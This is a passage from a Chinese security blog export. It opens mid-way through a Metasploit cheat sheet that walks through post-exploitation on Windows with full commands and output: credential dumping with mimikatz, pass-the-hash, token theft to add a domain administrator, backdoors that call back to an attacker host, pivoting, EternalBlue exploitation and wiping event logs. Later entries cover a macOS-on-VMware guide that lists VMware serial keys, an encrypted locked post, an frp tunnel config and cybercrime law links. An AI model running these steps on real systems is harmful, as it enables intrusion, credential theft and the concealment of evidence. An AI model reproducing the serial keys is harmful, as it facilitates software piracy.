FOUND Domain: test[+] FOUND Domain Controller: WIN-JDS94C5QEQQ (IP: 127.0.0.1)[*] Post module execution completedmsf post(windows/gather/enum_domain) &gt; exploit[+] FOUND Domain: test[+] FOUND Domain Controller: WIN-JDS94C5QEQQ (IP: 127.0.0.1)[*] Post module execution completed 注册表操作1234567891011121314151617181920212223meterpreter &gt; reg -hUsage: reg [command] [options]Interact with the target machine&apos;s registry.OPTIONS: -d &lt;opt&gt; The data to store in the registry value. -h Help menu. -k &lt;opt&gt; The registry key path (E.g. HKLM\Software\Foo). -r &lt;opt&gt; The remote machine name to connect to (with current process credentials -t &lt;opt&gt; The registry value type (E.g. REG_SZ). -v &lt;opt&gt; The registry value name (E.g. Stuff). -w Set KEY_WOW64 flag, valid values [32|64].COMMANDS: enumkey Enumerate the supplied registry key [-k &lt;key&gt;] createkey Create the supplied registry key [-k &lt;key&gt;] deletekey Delete the supplied registry key [-k &lt;key&gt;] queryclass Queries the class of the supplied key [-k &lt;key&gt;] setval Set a registry value [-k &lt;key&gt; -v &lt;val&gt; -d &lt;data&gt;] deleteval Delete the supplied registry value [-k &lt;key&gt; -v &lt;val&gt;] queryval Queries the data contents of a value [-k &lt;key&gt; -v &lt;val&gt;] 通过注册表设置开机自启动12345678910111213141516171819202122meterpreter &gt; reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\runEnumerating: HKLM\software\microsoft\windows\currentversion\run Values (1): VMware User Processmeterpreter &gt; reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v note -d &apos;C:\Windows\System32\notepad.exe&apos;Successfully set note of REG_SZ.meterpreter &gt; reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\runEnumerating: HKLM\software\microsoft\windows\currentversion\run Values (2): VMware User Process notemeterpreter &gt; reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v note Key: HKLM\software\microsoft\windows\currentversion\runName: noteType: REG_SZData: C:\Windows\System32\notepad.exe 通过注册表复制克隆用户123456789101112131415161718192021222324252627meterpreter &gt; reg enumkey -k HKLM\\sam\\sam\\domains\\account\\usersEnumerating: HKLM\sam\sam\domains\account\users Keys (3): 000001F4 000001F5 Names Values (1):meterpreter &gt; shellProcess 1884 created.Channel 1 created.Microsoft Windows [�汾 6.1.7601]��Ȩ���� (c) 2009 Microsoft Corporation����������Ȩ����C:\windows\system32&gt;net user guest /active:yes net user guest /active:yesC:\windows\system32&gt;reg copy HkLM\sam\sam\domains\account\users00001f4 HkLM\sam\sam\domains\account\users00001f5reg copy HkLM\sam\sam\domains\account\users00001f4 HkLM\sam\sam\domains\account\users00001f5 sam\sam\domains\account\users00001f4\F �Ѵ��ڣ�Ҫ������(Yes/No/All)? Yes\ֵ sam\sam\domains\account\users00001f4\V �Ѵ��ڣ�Ҫ������(Yes/No/All)?No �����ɹ����ɡ� 获取hash1234567891011121314151617meterpreter &gt; run post/windows/gather/smart_hashdump[*] Running module against TESTING[*] Hashes will be saved to the database if one is connected.[*] Hashes will be saved in loot in JtR password file format to:[*] /home/croxy/.msf4/loot/20150929225044_default_10.0.2.15_windows.hashes_407551.txt[*] Dumping password hashes...[*] Running as SYSTEM extracting hashes from registry[*] Obtaining the boot key...[*] Calculating the hboot key using SYSKEY 8c2c8d96e92a8ccfc407a1ca48531239...[*] Obtaining the user list and keys...[*] Decrypting user keys...[*] Dumping password hints...[+] Croxy:&quot;Whoareyou&quot;[*] Dumping password hashes...[+] Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: [+] HomeGroupUser$:1002:aad3b435b51404eeaad3b435b51404ee:e3f0347f8b369cac49e62a18e34834c0:::[+] test123:1003:aad3b435b51404eeaad3b435b51404ee:0687211d2894295829686a18ae83c56d::: 获取明文密码12345678910111213141516171819202122232425262728293031323334meterpreter &gt; getuidServer username: NT AUTHORITY\SYSTEM meterpreter &gt; load mimikatzLoading extension mimikatz...success.meterpreter &gt; msv[+] Running as SYSTEM[*] Retrieving msv credentials # 直接取到明文密码meterpreter &gt; wdigest[!] Not currently running as SYSTEM[*] Attempting to getprivs[+] Got SeDebugPrivilege[*] Retrieving wdigest credentialswdigest credentials===================# 直接取到明文密码meterpreter &gt; kerberos[+] Running as SYSTEM[*] Retrieving kerberos credentialskerberos credentials==================== # 取到用户列表和hashmeterpreter &gt; mimikatz_command -f samdump::hashesOrdinateur : TestingBootKey : 8c2c8d96e92a8ccfc407a1ca48531239 meterpreter &gt; mimikatz_command -f sekurlsa::searchPasswords[0] &#123; Croxy ; Testing ; hehe &#125;[1] &#123; test ; Testing ; test &#125; 通过hash获取权限1234567891011121314151617181920212223242526272829303132333435363738394041424344454647msf &gt; use exploit/windows/smb/psexecmsf exploit(psexec) &gt; show options Module options (exploit/windows/smb/psexec): Name Current Setting Required Description---- --------------- -------- -----------RHOST yes The target addressRPORT 445 yes Set the SMB service portSHARE ADMIN$ yes The share to connect to, can be an admi n share (ADMIN$,C$,...) or a normal read/write folder shareSMBDomain WORKGROUP no The Windows domain to use for authentic ationSMBPass no The password for the specified usernameSMBUser no The username to authenticate as Exploit target: Id Name-- ----0 Automatic msf exploit(psexec) &gt; set RHOST 192.168.0.254RHOST =&gt; 192.168.0.254msf exploit(psexec) &gt; set SMBUser isoskySMBUser =&gt; isoskymsf exploit(psexec) &gt; set SMBPass 01FC5A6BE7BC6929AAD3B435B51404EE:0CB6948805F797BF2A82807973B89537 SMBPass =&gt; 01FC5A6BE7BC6929AAD3B435B51404EE:0CB6948805F797BF2A82807973B89537msf exploit(psexec) &gt; exploit[*] Started reverse handler on 192.168.0.3:4444[*] Connecting to the server...[*] Authenticating to 192.168.0.254:445|WORKGROUP as user 'isosky'...[*] Uploading payload...[*] Created \UGdecsam.exe...[*] Binding to 367abb81-9844-35f1-ad32-98f038001003:2.0@ncacn_np:192.168.0.254[\svcctl] ...[*] Bound to 367abb81-9844-35f1-ad32-98f038001003:2.0@ncacn_np:192.168.0.254[\svcctl] ...[*] Obtaining a service manager handle...[*] Creating a new service (MZsCnzjn - "MrZdoQwIlbBIYZQJyumxYX")...[*] Closing service handle...[*] Opening service...[*] Starting the service...[*] Removing the service...[*] Closing service handle...[*] Deleting \UGdecsam.exe...[*] Sending stage (749056 bytes) to 192.168.0.254[*] Meterpreter session 1 opened (192.168.0.3:4444 -&gt; 192.168.0.254:1877) 内网渗透端口转发 (将远程主机3389端口转发到本地1234端口上)12meterpreter &gt; portfwd add -l 1234 -p 3389 -r 10.42.0.54[*] Local TCP relay created: 0.0.0.0:8081 &lt;-&gt; 10.42.0.54:80 内网代理123456789101112131415161718192021222324252627282930313233343536meterpreter &gt; run autoroute -s 10.42.0`.54[*] Adding a route to 10.42.0.54/255.255.255.0...[+] Added route to 10.42.0.54/255.255.255.0 via 10.42.0.54[*] Use the -p option to list all active routesmeterpreter &gt; background[*] Backgrounding session 1...msf exploit(handler) &gt; use auxiliary/server/socks4amsf auxiliary(socks4a) &gt; show options Module options (auxiliary/server/socks4a):Name Current Setting Required Description---- --------------- -------- -----------SRVHOST 0.0.0.0 yes The address to listen onSRVPORT 1080 yes The port to listen on. Auxiliary action:Name Description---- -----------Proxy msf auxiliary(socks4a) &gt; route printActive Routing Table====================Subnet Netmask Gateway------ ------- -------10.42.0.54 255.255.255.0 Session 1 msf auxiliary(socks4a) &gt; ifconfig[*] exec: ifconfig msf auxiliary(socks4a) &gt; set SRVHOST xxx.xxx.xx.xxSRVHOST =&gt; xxx.xxx.xx.xx (xxx.xxx.xx.xx为自己运行msf的vps机子) msf auxiliary(socks4a) &gt; exploit[*] Auxiliary module execution completed[*] Starting the socks4a proxy server 之后使用proxychains 设置socks4代理 链接vps上的1080端口 就可以访问内网了。 SSH代理123456789101112131415msf &gt; load meta_sshmsf &gt; use multi/ssh/login_passwordmsf &gt; set RHOST 192.168.56.3RHOST =&gt; 192.168.56.3msf &gt; set USER testUSER =&gt; testmsf &gt; set PASS reversePASS =&gt; reversemsf &gt; set PAYLOAD ssh/metassh_sessionPAYLOAD =&gt; ssh/metassh_sessionmsf &gt; exploit -z[*] Connecting to dsl@192.168.56.3:22 with password reverse[*] metaSSH session 1 opened (127.0.0.1 -&gt; 192.168.56.3:22) at 2011-12-28 03:51:16 +1300[*] Session 1 created in the background.msf &gt; route add 192.168.57.0 255.255.255.0 1 之后就是愉快的内网扫描了。当然还是推荐直接用ssh -f -N -D 127.0.0.1:6666 test@103.224.81.1.1 偷取token123456789101112131415161718192021222324252627282930313233343536meterpreter&gt;ps #查看目标机器进程，找出域控账户运行的进程IDmeterpreter&gt;steal_token pidmeterpreter &gt; getuidServer username: NT AUTHORITY\SYSTEMmeterpreter &gt; load incognitoLoading extension incognito...success.meterpreter &gt; list_tokens -u Delegation Tokens Available========================================IIS APPPOOL\zykNT AUTHORITY\IUSRNT AUTHORITY\LOCAL SERVICENT AUTHORITY\NETWORK SERVICENT AUTHORITY\SYSTEMQLWEB\Administrator Impersonation Tokens Available========================================NT AUTHORITY\ANONYMOUS LOGON meterpreter &gt; impersonate_token QLWEB\\Administrator[+] Delegation token available[+] Successfully impersonated user QLWEB\Administratormeterpreter &gt; getuidServer username: QLWEB\Administratormeterpreter&gt;add_user 0xfa funny –h192.168.3.98 #在域控主机上添加账户meterpreter&gt;add_group_user “DomainAdmins” 0xfa –h192.168.3.98 #将账户添加至域管理员组 内网扫描1234567891011meterpreter &gt; run autoroute -s 192.168.3.98meterpreter &gt; background[*] Backgrounding session 2...msf exploit(handler) &gt; use auxiliary/scanner/portscan/tcpmsf auxiliary(tcp) &gt; set PORTS 80,8080,21,22,3389,445,1433,3306PORTS =&gt; 80,8080,21,22,3389,445,1433,3306msf auxiliary(tcp) &gt; set RHOSTS 192.168.3.1/24RHOSTS =&gt; 192.168.3.1/24msf auxiliary(tcp) &gt; set THERADS 10THERADS =&gt; 10msf auxiliary(tcp) &gt; exploit 后门一个vbs后门，写入了开机启动项；但是容易被发现，还是需要大家发挥自己的智慧。 vbs后门persistence(通过自启动安装) 1234567891011121314meterpreter &gt; run persistence -X -i 5 -p 23333 -r 10.42.0.1或者meterpreter &gt; run persistence -U -i 5 -p 443 -r 192.168.161.138[*] Running Persistance Script[*] Resource file for cleanup created at /home/croxy/.msf4/logs/persistence/TESTING_20150930.3914/TESTING_20150930.3914.rc[*] Creating Payload=windows/meterpreter/reverse_tcp LHOST=10.42.0.1 LPORT=23333[*] Persistent agent script is 148453 bytes long[+] Persistent Script written to C:\Users\Croxy\AppData\Local\Temp\ulZpjVBN.vbs[*] Executing script C:\Users\Croxy\AppData\Local\Temp\ulZpjVBN.vbs[+] Agent executed with PID 4140[*] Installing into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\okiASNRzcLenulr[+] Installed into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\okiASNRzcLenulr会留一个后门，并添加进启动项 Metsvc(通过服务安装)Meterpreter服务后门 之后电脑就默默生成了一个自启服务meterpreter； 12345678910meterpreter &gt; run metsvc[*] Creating a meterpreter service on port 31337[*] Creating a temporary installation directory C:\Users\Croxy\AppData\Local\Temp\tuIKWqmuO...[*] &gt;&gt; Uploading metsrv.x86.dll...[*] &gt;&gt; Uploading metsvc-server.exe...[*] &gt;&gt; Uploading metsvc.exe...[*] Starting the service...* Installing service metsvc* Starting service* Service metsvc successfully installed. 连接Metsvc后门1234567891011msf exploit(handler) &gt; use exploit/multi/handlermsf exploit(handler) &gt; set payload windows/metsvc_bind_tcppayload =&gt; windows/metsvc_bind_tcpmsf exploit(handler) &gt; set RHOST 10.42.0.54RHOST =&gt; 10.42.0.54msf exploit(handler) &gt; set LPORT 31337LPORT =&gt; 31337msf exploit(handler) &gt; exploit[*] Started bind handler[*] 10.42.0.54 - Meterpreter session 6 closed. Reason: Died[*] Meterpreter session 6 opened (127.0.0.1 -&gt; 127.0.0.1) at 2018-03-19 21:37:23 +0800 清理痕迹123456meterpreter &gt; clearev[*] Wiping 12348 records from Application...[*] Wiping 1345 records from System...[*] Wiping 3 records from Security... meterpreter &gt; timestomp 一些常用的破解模块12345678910111213auxiliary/scanner/mssql/mssql_login auxiliary/scanner/ftp/ftp_login auxiliary/scanner/ssh/ssh_login auxiliary/scanner/telnet/telnet_login auxiliary/scanner/smb/smb_login auxiliary/scanner/mssql/mssql_login auxiliary/scanner/mysql/mysql_login auxiliary/scanner/oracle/oracle_login auxiliary/scanner/postgres/postgres_login auxiliary/scanner/vnc/vnc_login auxiliary/scanner/pcanywhere/pcanywhere_login auxiliary/scanner/snmp/snmp_login auxiliary/scanner/ftp/anonymous 一些好用的模块123456789auxiliary/admin/realvnc_41_bypass (Bypass VNCV4网上也有利用工具) auxiliary/admin/cisco/cisco_secure_acs_bypass （cisco Bypass 版本5.1或者未打补丁5.2版 洞略老） auxiliary/admin/http/jboss_deploymentfilerepository （内网遇到Jboss最爱:)） auxiliary/admin/http/dlink_dir_300_600_exec_noauth (Dlink 命令执行:) auxiliary/admin/mssql/mssql_exec （用爆破得到的sa弱口令进行执行命令 没回显:(） auxiliary/scanner/http/jboss_vulnscan (Jboss 内网渗透的好朋友) auxiliary/admin/mysql/mysql_sql (用爆破得到的弱口令执行sql语句:) auxiliary/admin/oracle/post_exploitation/win32exec （爆破得到Oracle弱口令来Win32命令执行） auxiliary/admin/postgres/postgres_sql (爆破得到的postgres用户来执行sql语句) 一些好用的脚本123456789101112uxiliary/scanner/rsync/modules_list （Rsync） auxiliary/scanner/misc/redis_server (Redis) auxiliary/scanner/ssl/openssl_heartbleed (心脏滴血) auxiliary/scanner/mongodb/mongodb_login (Mongodb) auxiliary/scanner/elasticsearch/indices_enum (elasticsearch) auxiliary/scanner/http/axis_local_file_include (axis本地文件包含) auxiliary/scanner/http/http_put (http Put) auxiliary/scanner/http/gitlab_user_enum (获取内网gitlab用户) auxiliary/scanner/http/jenkins_enum (获取内网jenkins用户) auxiliary/scanner/http/svn_scanner （svn Hunter） auxiliary/scanner/http/tomcat_mgr_login (Tomcat 爆破) auxiliary/scanner/http/zabbix_login （Zabbix 17_010 内网测试案例扫描1234msf &gt; use auxiliary/scanner/smb/smb_ms17_010 //加载扫描expmsf auxiliary(scanner/smb/smb_ms17_010) &gt; RHOSTS 192.168.2.0/24 //配置扫描网段msf auxiliary(scanner/smb/smb_ms17_010) &gt; set THREADS 50 //配置扫描线程msf auxiliary(scanner/smb/smb_ms17_010) &gt; run //进行扫描 漏洞利用1234567891011121314msf &gt; use exploit/windows/smb/ms17_010_eternalblue //加载攻击模块msf exploit(windows/smb/ms17_010_eternalblue) &gt; set RHOST 192.168.22.25 //配置攻击目标IPRHOSTS =&gt; 192.168.22.25msf exploit(windows/smb/ms17_010_eternalblue) &gt; set LHOST 192.168.5.146 //配置本机IPLHOST =&gt; 192.168.5.146msf exploit(windows/smb/ms17_010_eternalblue) &gt; set payload windows/x64/meterpreter/reverse_tcp //配置回链方式payload =&gt; windows/x64/meterpreter/reverse_tcpmsf exploit(windows/smb/ms17_010_eternalblue) &gt;攻击命令： msf exploit(windows/smb/ms17_010_eternalblue) &gt; exploit //发起攻击meterpreter &gt; screenshotScreenshot saved to: /root/RBDEvfGv.jpeg //可以到root目录下 查看对方电脑的截屏 其他参考： https://www.bodkin.ren/index.php/archives/555/ QQ群：397745473]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>漏洞利用</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[VMWare15安装macOS]]></title>
    <url>%2F2019%2F07%2F20%2F57_vmware%E5%AE%89%E8%A3%85MACos%2F</url>
    <content type="text"><![CDATA[VMWare15 安装macOS 详细安装步骤和安装中需要的工具 QQ群：397745473 安装虚拟机下载地址: https://download3.vmware.com/software/wkst/file/VMware-workstation-full-15.1.0-13591040.exe VMWare15 序列号： 123AC11H-4HZ05-08EDQ-APQGX-YCUC8ZG780-8EZ9M-M89LY-M5PEG-W2AZ8ZF3NU-D6XEJ-48E7Q-27YNC-PC8ED MacOS Unlocker for VMware下载地址 https://github.com/DrDonk/unlocker MAC OS 10.11任选其一：http://pan.baidu.com/s/1jI78s4Y 密码：drbhhttps://pan.baidu.com/s/1ggZ7oFx 密码: sxyj 下載映象檔案連結，darwin.iso，unlocker，beamoff。 合集下載連結：https://pan.baidu.com/s/1jeHA-ksEKT1iK5Ld7GmS9Q 密码：27tj 10.14 https://pan.baidu.com/s/13rD1YbYwSKSDVhIxoUVxHw 提取码：4nii 10.15 鏈接：https://pan.baidu.com/s/1NTGLJYyK2iNCMnnL8qi5kA 提取碼：c082 停服务停止VM相关的所有服务 运行MacOS Unlocker for VMwareMacOS Unlocker for VMware就是MAC 补丁。 以管理员执行 运行成功后，文件夹里文件发生了变化：多了backup和tools两个文件夹 准备工作结束了。这个tools文件夹里有我们要的东西 新建虚拟机新建虚拟机，选择光盘启动时选用cdr文件，系统版本选Mac OS 10.11 启动MAC前准备工作虚拟机安装建立后，别着急启动，还要更改这个虚拟机的配置文件。找到上图中安装虚拟机的位置，找到以”.vmx”结尾的文件，打开进行编辑。 1在smc.present = &quot;TRUE&quot; 后面添加smc.version = &quot;0&quot; 安装系统启动客户机，进入 MAC 系统配置界面，常规下一步操作。直到出现没有足够的可用空间来进行安装。 点击屏幕上方的 “实用工具 -&gt; 磁盘工具”。选中 “ vmware workstation SATA hard drive media ”，点击 “抹掉” 退出 “磁盘工具”，再次进行安装，此时选择出现的分区。 后面都是常规化操作。 安装VMware Tool安装完成后，鼠标和窗口大小都不舒服。这时候就要安装VMware Tool。还记得MacOS Unlocker for VMware 安装后出现的两个文件夹么，其中一个tools的文件夹中有我们要的工具。 那么如何使用呢？将mac 里的系统安装文件挂载推出 加载VMware Tool 安装VMware Tool，重启。这时候可以将VMware的5个服务手动启动了，怎么关闭的就怎么开启。 注意事项 安装顺序很重要； 所有安装路径建议纯英文； 安装成功后第一时间快照一下，养成良好习惯； 参考：https://blog.csdn.net/galaxy_yyg/article/details/82891044 参考:https://techsviewer.com/how-to-install-macos-10-15-catalina-on-vmware-on-windows-pc/ 参考:https://techsviewer.com/install-macos-10-15-catalina-on-virtualbox-on-windows-pc/ QQ群：397745473]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>vmware安装macOS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[批量下载联想工具库]]></title>
    <url>%2F2019%2F07%2F20%2F59_%E4%B8%8B%E8%BD%BD%E8%81%94%E6%83%B3%E7%9A%84%E5%B7%A5%E5%85%B7%E5%BA%93%2F</url>
    <content type="text"><![CDATA[请输入密码,有问题请加QQ群:397745473 Incorrect Password! No content to display! ]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[网络赚钱计划]]></title>
    <url>%2F2019%2F07%2F20%2F61_%E7%BD%91%E7%BB%9C%E8%B5%9A%E9%92%B1%E8%AE%A1%E5%88%92%2F</url>
    <content type="text"><![CDATA[请输入密码,有问题请加QQ群:397745473 Incorrect Password! No content to display! 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]]></content>
      <categories>
        <category>网赚</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>网赚</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[frp 穿透配置参考]]></title>
    <url>%2F2019%2F07%2F20%2F64_frp%E9%85%8D%E7%BD%AE%E5%8F%82%E8%80%83%2F</url>
    <content type="text"><![CDATA[frp 穿透配置参考 QQ群：397745473 frp 下载地址: https://github.com/fatedier/frp/releases 文档: https://github.com/fatedier/frp/blob/master/README_zh.md 服务端配置frps.ini 1234567891011121314151617181920212223242526272829303132# [common] is integral section[common]# A literal address or host name for IPv6 must be enclosed# in square brackets, as in &quot;[::1]:80&quot;, &quot;[ipv6-host]:http&quot; or &quot;[ipv6-host%zone]:80&quot;bind_addr = 0.0.0.0bind_port = 7000kcp_bind_port =7000# udp port used for kcp protocol, it can be same with &apos;bind_port&apos;# if not set, kcp is disabled in frps#kcp_bind_port = 5443# if you want to configure or reload frps by dashboard, dashboard_port must be setdashboard_port = 6443# dashboard assets directory(only for debug mode)dashboard_user = admindashboard_pwd = password# assets_dir = ./staticvhost_http_port = 8080vhost_https_port = 8081# console or real logFile path like ./frps.loglog_file = ./frps.log# debug, info, warn, errorlog_level = infolog_max_days = 3# auth tokentoken = tokenPassword# only allow frpc to bind ports you list, if you set nothing, there won&apos;t be any limit#allow_ports = 1-65535# pool_count in each proxy will change to max_pool_count if they exceed the maximum valuemax_pool_count = 50# if tcp stream multiplexing is used, default is truetcp_mux = true 客户端配置frpc.ini 1234567891011121314151617181920212223242526272829[common]server_addr = 服务器ipserver_port = 7000protocol = kcp# connections will be established in advancepool_count = 5# use tcp stream multiplexingtcp_mux = true# user name#user = RaspberryPitoken = tokenPasswordlog_file = ./frpc.loglog_level = infolog_max_days = 30[rdp-vsyour]#远程连接TCP类型type = tcp#本机的IP地址local_ip = iplocal_port = 被映射端口remote_port = 外网连接端口custom_domains = 绑定域名use_encryption = trueuse_compression = true QQ群：397745473]]></content>
      <categories>
        <category>穿透</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>穿透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[安全导论 网络安全基础入门 网络安全法律]]></title>
    <url>%2F2019%2F07%2F19%2F40_%E5%AE%89%E5%85%A8%E5%AF%BC%E8%AE%BA%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B3%95%E5%BE%8B%2F</url>
    <content type="text"><![CDATA[安全导论 网络安全基础入门 网络安全法律 《全国人大常委会关于维护互联网安全的决定》 2000年12月28日 第九届全国人民代表大会常务委员会第十九次会议通过，该决定共7条,其中有5条共15款的内容是对可以追究刑事责任的犯罪行为做出规定。 参考：https://www.12388.gov.cn/html/law/11.html QQ群：397745473 1.《全国人大常委会关于维护互联网安全的决定》 2000年12月28日第九届全国人民代表大会常务委员会第十九次会议通过，该决定共7条,其中有5条共15款的内容是对可以追究刑事责任的犯罪行为做出规定。 参考：https://www.12388.gov.cn/html/law/11.html QQ群：397745473 2.《中华人民共和国刑法修正案(九) 》 全国人大常委会2015年10月29日通过。其中在刑法286条后增加1条，作为286条之一，对网络服务提供者的犯罪行为作出规定 更多参考： 关于域名的几个法律问题普及【T00ls法律讲堂第一期】 https://www.t00ls.net/viewthread.php?tid=32244 某游戏外挂代理判决后的思考【T00ls法律讲堂第二期】 https://www.t00ls.net/viewthread.php?tid=32291 快播案件之反思【T00ls法律讲堂第三期】 https://www.t00ls.net/viewthread.php?tid=32668 给T00LS白帽的一些建议【T00ls法律讲堂第四期】 https://www.t00ls.net/viewthread.php?tid=34387 网络犯罪实务中的自首与坦白【T00ls法律讲堂第五期】 https://www.t00ls.net/viewthread.php?tid=35675 算算你能判多少年？【T00ls法律讲堂第六期】 https://www.t00ls.net/viewthread.php?tid=35804 看看传播“私密小视频”的后果【T00ls法律讲堂第七期】 https://www.t00ls.net/viewthread.php?tid=35861 办理危害计算机信息系统刑案法律解释【T00ls法律讲堂第八期】 https://www.t00ls.net/viewthread.php?tid=36398 程序员工作须知【T00ls法律讲堂第九期】 https://www.t00ls.net/viewthread.php?tid=36403 中华人民共和国网络安全法【T00ls法律讲堂第十期】 https://www.t00ls.net/viewthread.php?tid=36658 杨某一审刑事判决书（真实案例）【T00ls法律讲堂第十一期】 https://www.t00ls.net/viewthread.php?tid=36952 网络传销的法律后果【T00ls法律讲堂第十二期】 https://www.t00ls.net/viewthread.php?tid=38183 黑客攻击乐天网站犯法吗？【T00ls法律讲堂第十三期】 https://www.t00ls.net/viewthread.php?tid=38445 网络安全法之网络隐私权【T00ls法律讲堂第十四期】 https://www.t00ls.net/viewthread.php?tid=40280 